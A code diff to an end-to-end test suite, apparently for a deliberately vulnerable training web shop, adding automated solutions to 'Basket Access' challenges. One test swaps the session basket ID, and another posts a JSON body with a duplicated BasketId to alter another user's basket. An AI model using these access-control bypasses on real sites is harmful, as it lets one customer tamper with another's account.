@@ -25,7 +25,7 @@ describe('/#/basket', () => {
       protractor.expect.challengeSolved({challenge: 'Payback Time'})
     })
 
-    describe('challenge "accessBasket"', () => {
+    describe('challenge "Basket Access Tier 1"', () => {
       it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
         browser.executeScript('window.sessionStorage.bid = 3;')
 
@@ -34,7 +34,30 @@ describe('/#/basket', () => {
         // TODO Verify functionally that xit's not the basket of the admin
       })
 
-      protractor.expect.challengeSolved({challenge: 'Basket Access'})
+      protractor.expect.challengeSolved({challenge: 'Basket Access Tier 1'})
+    })
+
+    describe('challenge "Basket Access Tier 2"', () => {
+      it('should manipulate basket of other user instead of the one associated to logged-in user', () => {
+        browser.waitForAngularEnabled(false)
+        browser.executeScript(() => {
+          var xhttp = new XMLHttpRequest()
+          xhttp.onreadystatechange = function () {
+            if (this.status === 200) {
+              console.log('Success')
+            }
+          }
+
+          xhttp.open('POST', 'http://localhost:3000/api/BasketItems/')
+          xhttp.setRequestHeader('Content-type', 'text/plain')
+          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
+          xhttp.send('{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }') //eslint-disable-line
+        })
+        browser.driver.sleep(1000)
+        browser.waitForAngularEnabled(true)
+      })
+
+      protractor.expect.challengeSolved({challenge: 'Basket Access Tier 2'})
     })
   })
 
